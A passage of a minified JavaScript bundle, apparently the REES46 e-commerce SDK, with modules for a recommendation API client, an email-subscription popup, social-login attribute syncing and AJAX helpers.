                    throw Error("This 'perform' is abstract method, please define in class " + this.constructor.name)
                }
            }, {
                key: "performQueue",
                value: function() {
                    if (this.logger.debug("Each queue", this),
                    this.queue.length > 0) {
                        this.logger.debug("Found " + this.queue.length + " tasks in queue", this);
                        for (var e = void 0; null !== (e = this.queue.next()); )
                            this.perform(e)
                    }
                }
            }]),
            e
        }());
        t.default = c
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e(t) {
                var r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , n = this
                  , o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , s = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                i(this, e),
                this.name = t,
                this.settings = o,
                this.result = r,
                this.shop = s;
                var a = '<div style="opacity: 1" id=\'' + t + "' class='" + t + " " + (this.settings.type ? t + "_toolbar " : this.settings.overlay ? "" : t + "_side") + (this.settings.products ? " " + t + "_products" : "") + "'><div id='" + t + "-modal' class='" + t + "__wrap'><div class='" + t + "__content'>";
                this.settings.remote_picture_url && (a += '<div id="' + t + "-image\"><img class='" + t + "-image' src='" + this.settings.remote_picture_url + "'></div>");
                var u = "";
                if (this.settings.products && this.settings.products.length) {
                    u += '<div class="' + t + '__products"><h1>' + this.settings.products_title + '</h1><div class="' + t + '__products-content">';
                    for (var c = 0; c < this.settings.products.length; c++) {
                        var l = this.settings.products[c];
                        u += '<a class="' + t + '__product" href="' + l[0] + (l[0].match(/\?/) ? "&" : "?") + 'recommended_by=recently_viewed" target="_blank"><div class="' + t + '__product-image"><img src="' + l[1] + '" /></div><div><div class="' + t + '__product-name">' + l[2] + '</div><div class="' + t + '__product-price">' + ("$" === this.shop.currency ? "$ " + l[3] : l[3] + " " + this.shop.currency) + '</div><div class="' + t + '__product-buy">' + this.settings.products_buy + "</div></div></a>"
                    }
                    u += "</div></div>"
                }
                if (a += "<div id='" + t + "-content'><h1>" + this.settings.header + "</h1><p class='" + t + "__intro'>" + this.settings.text + '</p><p class="' + t + '__successfully">' + this.settings.successfully + "</p></div><form id='" + t + "-form'><div class='" + t + "__form_elem'><button type='submit' id='" + t + "-submit' class='" + t + "__button'>" + this.settings.button + "</button></div><label class='" + t + "__checkbox'><input type='checkbox' id='" + t + '-success\' required="required" checked="checked" disabled="disabled"><span>' + this.settings.agreement + "</span></label></form>" + u + "<span id='" + t + "-close' class='" + t + "__close'></span></div></div></div>",
                !document.body.insertAdjacentHTML)
                    throw Error("Old browser");
                document.body.insertAdjacentHTML("beforeEnd", a),
                this.dialog = document.getElementById(t),
                this.modal = document.getElementById(t + "-modal"),
                this.closeButton = document.getElementById(t + "-close"),
                this.form = document.getElementById(t + "-form"),
                this.submitButton = document.getElementById(t + "-submit"),
                this.userAccepted = !1,
                this.closeTimer = 0,
                this.dialog.onclick = this.close.bind(this),
                this.modal.onclick = function(e) {
                    e.stopPropagation()
                }
                ,
                this.closeButton.onclick = this.close.bind(this),
                document.onkeydown = function(e) {
                    e = e || window.event,
                    27 === e.keyCode && n.close()
                }
                ,
                this.submitButton.onclick = this.submit.bind(this)
            }
            return n(e, [{
                key: "close",
                value: function() {
                    var e = this;
                    clearTimeout(this.closeTimer),
                    this.userAccepted || "function" != typeof this.result.onError || this.result.onError(),
                    "function" == typeof this.result.onClose && this.result.onClose(),
                    this.dialog.className = this.dialog.className + " " + this.name + "_removed",
                    setTimeout(function() {
                        e.dialog.parentNode.removeChild(e.dialog)
                    }, 300)
                }
            }, {
                key: "submit",
                value: function(e) {
                    var t = this;
                    e.preventDefault(),
                    this.formValid(e) && ("function" == typeof this.result.onSuccess ? this.result.onSuccess(this.submitSuccess.bind(this), function() {
                        t.close()
                    }) : this.submitSuccess())
                }
            }, {
                key: "submitSuccess",
                value: function() {
                    var e = this
                      , t = document.getElementById("" + this.name);
                    t.className = t.className + " " + this.name + "_successfully",
                    this.userAccepted = !0,
                    this.settings.products || "function" == typeof this.result.onClose || (this.closeTimer = setTimeout(function() {
                        e.close()
                    }, 2e3))
                }
            }, {
                key: "formValid",
                value: function(e) {
                    var t = this.form.querySelector("input:invalid");
                    return t ? (t.focus(),
                    !1) : e.target.checkValidity()
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        }
        : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }
          , o = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , s = r(0)
          , a = function(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }(s)
          , u = function() {
            function e() {
                i(this, e)
            }
            return o(e, null, [{
                key: "set",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    if ("object" === (void 0 === t ? "undefined" : n(t)) && !a.default.isBot()) {
                        var r = {};
                        t.id && (r["attributes[id]"] = t.id),
                        t.email && t.email.match(/@/) && (r["attributes[email]"] = t.email),
                        t.gender && -1 !== ["m", "f"].indexOf(t.gender) && (r["attributes[gender]"] = t.gender),
                        t.birthday && t.birthday.match(/^\d{4}-\d{2}-\d{2}$/) && (r["attributes[birthday]"] = t.birthday),
                        t.age && (r["attributes[age]"] = t.age),
                        t.fb_id && (r["attributes[fb_id]"] = t.fb_id),
                        t.vk_id && (r["attributes[vk_id]"] = t.vk_id),
                        t.location && (e.user.location = t.location,
                        r["attributes[user_location]"] = t.location),
                        Object.keys(r).length > 0 && (r.shop_id = e.shop.token,
                        r.session_id = e.user.ssid,
                        e.ajax.sendWithRetry("post", e.api.getAPIUrl("/push_attributes"), r))
                    }
                }
            }, {
                key: "fetchFacebookId",
                value: function(t) {
                    "undefined" != typeof FB && "function" == typeof FB.getLoginStatus && FB.getLoginStatus(function(r) {
                        "connected" === r.status && FB.api("/me", {
                            fields: "gender,email"
                        }, function(r) {
                            e.set(t, {
                                email: r.email,
                                gender: "male" === r.gender ? "m" : "female" === r.gender ? "f" : null,
                                fb_id: r.id
                            })
                        })
                    })
                }
            }, {
                key: "fetchVkontakteId",
                value: function(t) {
                    "undefined" != typeof VK && void 0 !== VK.Auth && "function" == typeof VK.Auth.getLoginStatus && VK.Auth.getLoginStatus(function(r) {
                        "connected" === r.status && e.set(t, {
                            vk_id: r.session.mid
                        })
                    })
                }
            }]),
            e
        }();
        t.default = u
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        }
        : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }
          , o = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , s = function() {
            function e(t) {
                i(this, e),
                this.core = t
            }
            return o(e, [{
                key: "get",
                value: function(e, t, r, i) {
                    this.type = e,
                    this.params = t || {},
                    this.success = r,
                    this.failure = i,
                    this.validate();
                    var n = {
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid,
                        recommender_type: this.type
                    };
                    this.params.cart && (n["cart_item_id[]"] = [],
                    this.params.cart.forEach(function(e, t) {
                        n["cart_item_id[]"].push(e)
                    })),
                    this.params.locations && (n.locations = this.params.locations.join(",")),
                    this.params.extended && (n.extended = 1),
                    this.params.discount && (n.discount = 1),
                    this.params.search_query && (n.search_query = this.params.search_query),
                    this.params.category && (n.category = this.params.category),
                    this.params.categories && (n.categories = this.params.categories.join(",")),
                    this.params.item && (n.item_id = this.params.item),
                    this.params.limit && (n.limit = this.params.limit),
                    this.params.brands && (n.brands = this.params.brands.join(",")),
                    this.params.exclude_brands && (n.exclude_brands = this.params.exclude_brands.join(",")),
                    this.core.ajax.sendGet(this.core.api.getAPIUrl("/recommend"), n).then(r).catch(function(e) {
                        if (!i)
                            throw Error(e);
                        i(e)
                    })
                }
            }, {
                key: "validate",
                value: function() {
                    if (!e.isTypeValid(this.type))
                        throw Error('Recommender: invalid type "' + this.type + '"');
                    if (void 0 == this.params || null === this.params)
                        throw Error("Recommender: params not set");
                    if ("function" != typeof this.success)
                        throw Error('Recommender: success callback must be function, got "' + n(this.success) + '"');
                    if (this.failure && "function" != typeof this.failure)
                        throw Error('Recommender: failure callback must be function or undefined, got "' + n(this.success) + '"');
                    if (this.params.cart) {
                        if (!(this.params.cart instanceof Array))
                            throw Error("Recommender: incorrect cart syntax, must be array");
                        0 === this.params.cart.length && (this.params.cart = null)
                    }
                    if (this.params.locations) {
                        if (!(this.params.locations instanceof Array))
                            throw Error("Recommender: incorrect locations syntax, must be array");
                        0 === this.params.locations.length && (this.params.locations = null)
                    }
                    if (this.params.categories) {
                        if (!(this.params.categories instanceof Array))
                            throw Error("Recommender: incorrect categories syntax, must be array");
                        0 === this.params.categories.length && (this.params.categories = null)
                    }
                    if (this.params.brands) {
                        if (!(this.params.brands instanceof Array))
                            throw Error("Recommender: incorrect brands syntax, must be array");
                        0 === this.params.brands.length && (this.params.brands = null)
                    }
                    if (this.params.exclude_brands) {
                        if (!(this.params.exclude_brands instanceof Array))
                            throw Error("Recommender: incorrect exclude_brands syntax, must be array");
                        0 === this.params.exclude_brands.length && (this.params.exclude_brands = null)
                    }
                    switch (this.type) {
                    case "search":
                        if (!this.params.search_query)
                            throw Error("Recommender: search query is not set for search recommender");
                        break;
                    case "see_also":
                        if (!this.params.cart)
                            throw Error('Recommender: cart is empty, recommender "see_also" doesn\'t work without cart')
                    }
                    return !0
                }
            }], [{
                key: "isTypeValid",
                value: function(t) {
                    return e.getTypes().indexOf(t) >= 0
                }
            }, {
                key: "getTypes",
                value: function() {
                    return ["interesting", "also_bought", "popular", "similar", "recently_viewed", "see_also", "buying_now", "supply", "trigger_mail", "digest_mail", "r46_returner", "search", "web_push_digest", "web_push_trigger"]
                }
            }]),
            e
        }();
        t.default = s
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        function o(e, t) {
            if (!e)
                throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }
        function s(e, t) {
            if ("function" != typeof t && null !== t)
                throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }),
            t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , u = r(0)
          , c = i(u)
          , l = r(5)
          , h = i(l)
          , f = function(e) {
            function t(e, r, i) {
                var s = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null;
                n(this, t);
                var a = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, [], e.logger));
                if (a.core = e,
                a.buttonClass = r,
                a.name = i,
                a.popupInterval = s,
                a.popupEnabled = !0,
                a.initialized = !1,
                !(e instanceof c.default))
                    throw Error("Variable core must be instance Core class");
                return a.fetchUserInfo(),
                a
            }
            return s(t, e),
            a(t, [{
                key: "init",
                value: function() {
                    var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    this.settings = e.settings || null,
                    this.status = e.status || null,
                    this.popupInterval = 1e3 * (e.settings && e.settings.timer ? e.settings.timer : this.popupInterval || 90),
                    this.popupPager = e.settings && e.settings.pager ? e.settings.pager : 0,
                    this.popupCursor = e.settings && e.settings.cursor ? e.settings.cursor : 0,
                    this.popupPager > 0 && (this.pagesCount = parseInt(localStorage.getItem(this.name + "_pages")) || 0,
                    this.pagesCount++,
                    localStorage.setItem(this.name + "_pages", this.pagesCount))
                }
            }, {
                key: "popup",
                value: function() {
                    throw Error("This popup is abstract method")
                }
            }, {
                key: "subscribe",
                value: function() {
                    throw Error("This subscribe is abstract method")
                }
            }, {
                key: "isShowed",
                value: function() {
                    return this.currentUserInfo.showed
                }
            }, {
                key: "isSubscribed",
                value: function() {
                    return "accepted" === this.status
                }
            }, {
                key: "addStyleToPage",
                value: function(e) {
                    this.logger.debug("Добавление стиля окна подписки на страницу.", this);
                    var t = document.createElement("link");
                    t.setAttribute("rel", "stylesheet"),
                    t.setAttribute("type", "text/css"),
                    t.setAttribute("href", "//" + this.core.api.getMasterHost() + "/" + e + "/" + this.core.shop.token + ".css"),
                    document.getElementsByTagName("head")[0].appendChild(t)
                }
            }, {
                key: "fetchUserInfo",
                value: function() {
                    localStorage[this.name] ? (this.logger.debug("пользователь опознан.", this),
                    this.currentUserInfo = JSON.parse(localStorage[this.name])) : (this.logger.debug("неизвестный пользователь.", this),
                    this.currentUserInfo = {
                        firstVisited: (new Date).getTime(),
                        showed: !1
                    }),
                    this.saveUserInfo()
                }
            }, {
                key: "saveUserInfo",
                value: function() {
                    localStorage.setItem(this.name, JSON.stringify(this.currentUserInfo))
                }
            }, {
                key: "fetchPopupInterval",
                value: function() {
                    var e = this.name + "_popup_interval"
                      , t = c.default.getUrlVars()[e];
                    void 0 !== t && t ? (this.popupInterval = 1e3 * parseInt(t),
                    localStorage.setItem(e, t)) : localStorage.hasOwnProperty(e) && (this.popupInterval = 1e3 * parseInt(localStorage[e]))
                }
            }, {
                key: "schedulePopup",
                value: function(e) {
                    var t = this;
                    if (!this.isShowed() && this.popupEnabled && "declined" !== this.status && "accepted" !== this.status && this.settings.enabled) {
                        if (this.logger.debug("пользователю еще не было показано окно подписки.", this),
                        this.fetchPopupInterval(),
                        this.popupInterval > 0) {
                            var r = this.currentUserInfo.firstVisited + this.popupInterval
                              , i = (new Date).getTime();
                            if (r <= i)
                                this.logger.debug("будет показано сейчас.", this),
                                e();
                            else {
                                var n = r - i;
                                this.logger.debug("будет показано через " + n + " мс.", this),
                                this.popupTimeout = setTimeout(function() {
                                    this.currentUserInfo.showed ? this.logger.debug("было показано ранее, отмена показа.", this) : e()
                                }
                                .bind(this), n)
                            }
                        }
                        !this.currentUserInfo.showed && this.popupPager > 0 && this.popupPager <= this.pagesCount && e(),
                        !this.currentUserInfo.showed && this.popupCursor > 0 && c.default.addEvent(document, "mousemove", function(r) {
                            var i = r.clientY || r.screenY;
                            t.popupCursor >= i && !t.currentUserInfo.showed && (t.currentUserInfo.showed = !0,
                            e(),
                            c.default.addEvent(document, "mousemove", null))
                        })
                    } else
                        this.popupEnabled && this.logger.debug("пользователю уже было показано окно веб пуш подписок.", this)
                }
            }, {
                key: "disableSchedulePopup",
                value: function() {
                    this.logger.debug("запрет показа окна на странице", this),
                    this.popupEnabled = !1,
                    this.popupTimeout && clearTimeout(this.popupTimeout)
                }
            }, {
                key: "activateSubscribeButtons",
                value: function(e) {
                    var t = document.getElementsByClassName(this.buttonClass);
                    if (t.length > 0)
                        for (var r = t.length - 1; r >= 0; r--)
                            t[r].onclick = function(t) {
                                t.preventDefault();
                                var r = this.getAttribute("data-rees46-popup-header");
                                null !== r && (this.settings.header = r);
                                var i = this.getAttribute("data-rees46-popup-text");
                                null !== i && (this.settings.text = i),
                                e()
                            }
                }
            }, {
                key: "removeSubscribeButtons",
                value: function() {
                    var e = document.getElementsByClassName(this.buttonClass);
                    if (e.length > 0) {
                        this.logger.debug(this.constructor.name + " удаление кнопок подписки со страницы.");
                        for (var t = e.length - 1; t >= 0; t--)
                            e[t].remove()
                    }
                }
            }, {
                key: "perform",
                value: function(e) {
                    switch (void 0 === e[0] && this.logger.warn("Undefined command", this),
                    e[0]) {
                    case "popup":
                        "disable" === e[1] && this.disableSchedulePopup(),
                        "show" === e[1] && this.popup();
                        break;
                    case "subscribed":
                        "function" == typeof e[1] && e[1](this.isSubscribed())
                    }
                }
            }], [{
                key: "isPopupActive",
                value: function() {
                    return document.getElementById("rees46-web-push-popup-modal") || document.getElementById("rees46-popup-modal")
                }
            }]),
            t
        }(h.default);
        t.default = f
    }
    , function(e, t) {
        var r;
        r = function() {
            return this
        }();
        try {
            r = r || Function("return this")() || (0,
            eval)("this")
        } catch (e) {
            "object" == typeof window && (r = window)
        }
        e.exports = r
    }
    , function(e, t, r) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }),
        t.Core = void 0;
        var i = r(0)
          , n = function(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }(i);
        window.r46 = function(e) {
            var t = new n.default(e,{
                debug: !1
            });
            return function() {
                t.push(arguments)
            }
        }(window.r46.q),
        t.Core = n.default
    }
    , function(e, t, r) {
        "use strict";
        function i() {
            if (u.length)
                throw u.shift()
        }
        function n(e) {
            var t;
            t = a.length ? a.pop() : new o,
            t.task = e,
            s(t)
        }
        function o() {
            this.task = null
        }
        var s = r(2)
          , a = []
          , u = []
          , c = s.makeRequestCallFromTimer(i);
        e.exports = n,
        o.prototype.call = function() {
            try {
                this.task.call()
            } catch (e) {
                n.onerror ? n.onerror(e) : (u.push(e),
                c())
            } finally {
                this.task = null,
                a[a.length] = this
            }
        }
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        }
        : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }
          , s = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , a = r(0)
          , u = (i(a),
        r(21))
          , c = i(u)
          , l = r(28)
          , h = function() {
            function e(t) {
                n(this, e),
                this.core = t
            }
            return s(e, [{
                key: "send",
                value: function(e, t) {
                    var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    return "post" === e.toLowerCase() ? this.sendPost(t, r) : this.sendGet(t, r)
                }
            }, {
                key: "sendWithRetry",
                value: function(e, t) {
                    var r = this
                      , i = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                      , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null;
                    return this.send(e, t, i).catch(function(o) {
                        r.core.pushError(o, e, t, i),
                        "function" == typeof n && n(o)
                    })
                }
            }, {
                key: "sendGet",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                      , r = "";
                    return "object" === (void 0 === t ? "undefined" : o(t)) && (r = l(t)),
                    new c.default(function(t, i) {
                        var n = window.XDomainRequest || window.XMLHttpRequest
                          , o = new n;
                        o.withCredentials = "true";
                        var s = function() {
                            var e = Error(o.statusText);
                            e.code = o.status,
                            i(e)
                        }
                          , a = function() {
                            if (4 === o.readyState) {
                                if (200 === o.status) {
                                    var e = o.responseText;
                                    o.getResponseHeader("Content-Type").match(/application\/json/) && (e = JSON.parse(e)),
                                    "function" == typeof t && t(e)
                                }
                                o.status >= 400 && s()
                            }
                        }
                          , u = function() {
                            var e = o.responseText;
                            e = JSON.parse(e),
                            "function" == typeof t && t(e)
                        };
                        n === window.XDomainRequest ? (o.open("GET", e + "?" + r, !0),
                        o.onload = u,
                        o.onerror = s,
                        o.send(null)) : (o.open("GET", e + "?" + r, !0),
                        o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                        o.onload = a,
                        o.onerror = s,
                        o.send(null))
                    }
                    )
                }
            }, {
                key: "sendPost",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return "object" === (void 0 === t ? "undefined" : o(t)) && (t = l(t)),
                    new c.default(function(r, i) {
                        var n = window.XDomainRequest || window.XMLHttpRequest
                          , o = new n;
                        o.withCredentials = "true";
                        var s = function() {
                            var e = Error(o.statusText);
                            e.code = o.status,
                            i(e)
                        }
                          , a = function() {
                            if (4 === o.readyState && 200 === o.status) {
                                var e = o.responseText;
                                e = JSON.parse(e),
                                "function" == typeof r && r(e)
                            }
                            o.status >= 500 && s()
                        }
                          , u = function() {
                            var e = o.responseText;
                            e = JSON.parse(e),
                            "function" == typeof r && r(e)
                        };
                        n === window.XDomainRequest ? (o.open("POST", e + "?" + t, !0),
                        o.onload = u,
                        o.onerror = s,
                        o.send(null)) : (o.open("POST", e, !0),
                        o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                        o.onload = a,
                        o.onerror = s,
                        o.send(t))
                    }
                    )
                }
            }]),
            e
        }();
        t.default = h
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e(t) {
                i(this, e),
                this.env = t,
                this.url = e.getProtocol() + "api.rees46.com"
            }
            return n(e, [{
                key: "getAPIUrl",
                value: function(t) {
                    return e.getProtocol() + this.getHost() + t
                }
            }, {
                key: "getHost",
                value: function() {
                    switch (this.env) {
                    case "development":
                        return "dev.api.rees46.com:8080";
                    case "staging":
                        return "api.zombolab.com";
                    default:
                        return "api.rees46.com"
                    }
                }
            }, {
                key: "getMasterHost",
                value: function() {
                    switch (this.env) {
                    case "development":
                        return "localhost:3000";
                    case "staging":
                        return "zombolab.com";
                    default:
                        return "rees46.com"
                    }
                }
            }, {
                key: "getWebPushHost",
                value: function(e) {
                    switch (this.env) {
                    case "development":
                        return "http://localhost:8090";
                    case "staging":
                        return "https://" + e + ".push.zombolab.com";
                    default:
                        return "https://" + e + ".push.rees46.com"
                    }
                }
            }], [{
                key: "getProtocol",
                value: function() {
                    return "https:" === document.location.protocol ? "https://" : "http://"
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        function o(e, t) {
            if (!e)
                throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }
        function s(e, t) {
            if ("function" != typeof t && null !== t)
                throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }),
            t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , u = function e(t, r, i) {
            null === t && (t = Function.prototype);
            var n = Object.getOwnPropertyDescriptor(t, r);
            if (void 0 === n) {
                var o = Object.getPrototypeOf(t);
                return null === o ? void 0 : e(o, r, i)
            }
            if ("value"in n)
                return n.value;
            var s = n.get;
            if (void 0 !== s)
                return s.call(i)
        }
          , c = r(0)
          , l = i(c)
          , h = r(6)
          , f = i(h)
          , p = r(7)
          , d = i(p)
          , m = r(9)
          , g = i(m)
          , b = function(e) {
            function t(e) {
                var r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                n(this, t);
                var i = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, "rees46-subscribe-button", "rees46_subscription"));
                return i.settings = r.settings || null,
                i.status = r.status || null,
                i
            }
            return s(t, e),
            a(t, [{
                key: "init",
                value: function() {
                    var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "init", this).call(this, e),
                    this.enabled() ? this.addStyleToPage("popup_css") : (this.removeSubscribeButtons(),
                    this.logger.debug("не активен", this))
                }
            }, {
                key: "onInitialize",
                value: function() {
                    this.initialized = !0,
                    this.activateSubscribeButtons(this.popup.bind(this)),
                    this.performQueue(),
                    this.schedulePopup(this.popup.bind(this)),
                    this.users()
                }
            }, {
                key: "enabled",
                value: function() {
                    return this.settings && this.settings.enabled && !l.default.isMobile()
                }
            }, {
                key: "isSubscribed",
                value: function() {
                    return "accepted" === this.status || this.settings && this.settings.has_email
                }
            }, {
                key: "popup",
                value: function() {
                    !g.default.isPopupActive() && this.settings && this.settings.enabled && (this.popupShow(this.onPopupSubmit.bind(this), this.unsubscribe.bind(this)),
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/subscriptions/showed"), {
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    }))
                }
            }, {
                key: "popupShow",
                value: function(e, t) {
                    var r = this;
                    if (this.enabled()) {
                        this.logger.debug("показ окна сбора.", this);
                        var i = "rees46-popup"
                          , n = new f.default(i,{
                            onSuccess: function(t, i) {
                                return e.apply(r, [t, i, r.popupDialog.emailField.value])
                            },
                            onError: t
                        },this.settings,this.core.shop);
                        n.form.insertAdjacentHTML("afterBegin", "<div class='" + i + "__form_elem " + i + "__hidden'><input type='hidden' id='" + i + "-name' placeholder='Имя'></div><div class='" + i + "__form_elem " + i + "__hidden'><input type='hidden' id='" + i + "-surname' placeholder='Фамилия'></div>"),
                        n.submitButton.insertAdjacentHTML("beforeBegin", "<input type='email' id='" + i + "-email' required placeholder='Email' tabindex='1'>"),
                        n.nameField = document.getElementById(i + "-name"),
                        n.surnameField = document.getElementById(i + "-surname"),
                        n.emailField = document.getElementById(i + "-email"),
                        n.nameField.onkeypress = n.nameField.onchange = n.surnameField.onkeypress = n.surnameField.onchange = n.emailField.onkeypress = n.emailField.onchange = function() {
                            this.value = this.value.substr(0, 250)
                        }
                        ,
                        this.popupDialog = n,
                        this.currentUserInfo.showed = !0,
                        this.saveUserInfo()
                    } else
                        this.logger.debug("попытка показать окно при выключенной функции сбора.", this)
                }
            }, {
                key: "onPopupSubmit",
                value: function(e, t) {
                    this.subscribe(e, t, "mailings", this.popupDialog.emailField.value, this.popupDialog.nameField.value + " " + this.popupDialog.surnameField.value)
                }
            }, {
                key: "subscribe",
                value: function(e, t, r) {
                    var i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : ""
                      , n = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : ""
                      , o = {
                        type: r,
                        declined: !1,
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    };
                    n && (o.name = n),
                    i && /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(i) && (o.email = i),
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/subscriptions"), o, t).then(function(t) {
                        "function" == typeof e && e(t)
                    })
                }
            }, {
                key: "unsubscribe",
                value: function() {
                    var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mailings";
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/subscriptions"), {
                        declined: "true",
                        type: e,
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    })
                }
            }, {
                key: "perform",
                value: function(e) {
